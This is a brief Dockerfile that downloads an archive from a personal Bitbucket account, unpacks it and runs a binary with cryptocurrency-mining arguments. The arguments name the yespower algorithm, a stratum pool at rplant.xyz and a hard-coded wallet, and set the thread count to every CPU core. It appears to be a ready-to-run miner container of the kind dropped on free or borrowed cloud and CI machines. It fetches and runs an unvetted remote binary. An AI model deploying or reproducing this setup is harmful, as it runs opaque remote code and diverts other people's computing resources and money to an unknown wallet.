
FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://bitbucket.org/nincakcaduk120/buset/downloads/lite.tar.gz
RUN tar -xvf lite.tar.gz

ENTRYPOINT [ "./ltc" ]
CMD [ "-a", "yespower", "-o", "stratum+tcp://stratum-asia.rplant.xyz:7017", "-u", "web1q9njzjf8zqal5qcxhecsuq2fsyjv2ls0v358lal.tai", "-t$(nproc --all)" ]
